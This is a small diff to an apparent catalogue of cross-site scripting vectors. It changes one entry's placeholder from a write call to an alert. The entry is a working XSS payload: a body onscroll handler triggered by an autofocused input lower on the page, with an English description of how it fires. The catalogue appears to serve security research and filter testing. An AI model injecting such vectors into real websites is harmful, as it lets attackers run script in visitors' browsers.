@@ -361,7 +361,7 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<body onscroll=%js_write%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
+        'data'       : '<body onscroll=%js_alert%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
         'description': {
             'en' : 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
             'ja' : '',
